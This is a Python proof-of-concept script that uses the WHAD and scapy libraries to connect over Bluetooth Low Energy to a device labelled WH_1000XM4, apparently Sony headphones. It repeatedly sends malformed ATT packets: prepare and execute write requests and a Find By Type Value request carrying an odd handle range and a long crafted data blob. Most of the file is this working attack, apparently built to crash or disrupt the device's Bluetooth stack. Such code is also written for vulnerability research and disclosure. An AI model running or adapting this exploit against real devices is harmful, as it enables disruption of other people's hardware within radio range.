from whad.ble import Central
from whad.device import WhadDevice

import os
from datetime import datetime
import time

from scapy.layers.bluetooth import *
from scapy.layers.bluetooth4LE import *

session_cnt = 0
none_cnt = 0

def show(packet):
    print(packet.metadata, repr(packet))

def main_sending(central,bt_addr,is_addr_random):

    global session_cnt
    print("session_cnt = ",session_cnt)
    current_log_case = "log_case_"+str(session_cnt)
    os.mkdir(current_log_case)

    print("New connection")
    central.connect(bt_addr , random = is_addr_random)
    central.enable_synchronous(True)

    global none_cnt

    try :

        # Prepare Write Request
        _gatt_handle = 130 # WH_1000XM4
        _offset      = 0x01
        _data        = b'\xaa'
        _len         = 5 + 1
        poc_pdu_1 = BTLE_DATA()/L2CAP_Hdr(len=_len,cid=0x0004)/ATT_Hdr()/ATT_Prepare_Write_Request(gatt_handle=_gatt_handle, offset=_offset, data=_data)

        # Send Prepare Write Request
        central.send_pdu(pdu = poc_pdu_1,conn_handle=central.connection.conn_handle)

        # Execute Write Request
        poc_pdu_2 = BTLE_DATA()/L2CAP_Hdr(len=2,cid=0x0004)/ATT_Hdr()/ATT_Execute_Write_Request(flags = 0x01) #xm4

        # Send Execute Write Request
        central.send_pdu(pdu = poc_pdu_2,conn_handle=central.connection.conn_handle) 

        # Find By Type Value Request
        _start = 0x9ba9 # WH_1000XM4
        _end   = 0xde2d # WH_1000XM4
        _uuid  = 0xbbe8 # WH_1000XM4
        _data  = b"\xca\x94\x52\x36\xae\xf2\xab\x3a\x52\x5b\xd9\x4c\x06\xac\x58\x06\xdc\xb2\xd9\x18\x34\x7a\xdd\x67\x7f\x6b\x58\x22\x9c\x44\xa6\x60\xf6\xf3\x33\x89\x3b\x96\xd9\xdc\x07\x93\xc7\x81\xa8\x33\x07\x13\x99\x49\x53\x4c\x3d\x9d\x71\xce\xb4\x59\xcb\x8d\xb1\x91\x40" # WH_1000XM4
        _len   = 7 + len(_data) # WH_1000XM4
        poc_pdu_xm4 = BTLE_DATA()/L2CAP_Hdr(len=_len,cid=0x0004)/ATT_Hdr()/ATT_Find_By_Type_Value_Request(start=_start, end=_end, uuid=_uuid, data=_data) #WH_1000XM4

        # Send Find By Type Value Request
        central.send_pdu(pdu = poc_pdu_xm4, conn_handle=central.connection.conn_handle)

    except ImportError as IE: # ImportError

        print("\nError! : ", repr(IE))
        f = open(current_log_case + "/error.txt","w")
        f.write(str(datetime.fromtimestamp(time.time()))+"\n")
        f.write(repr(IE))
        f.close()

    except Exception as error: # Catch ConnectionLostException for instance

        print("\nError! : ",repr(error))
        f = open(current_log_case + "/error.txt","w")
        f.write(str(datetime.fromtimestamp(time.time()))+"\n")
        f.write(repr(error))
        f.close()


    #Disconnect
    print("Stop connection")
    session_cnt += 1


central = Central(WhadDevice.create('hci1'))
bt_addr , is_addr_random = 'cb:e4:A3:6b:94:59', True     # Connect to WH_1000XM4

while True:

    main_sending(central,bt_addr,is_addr_random)

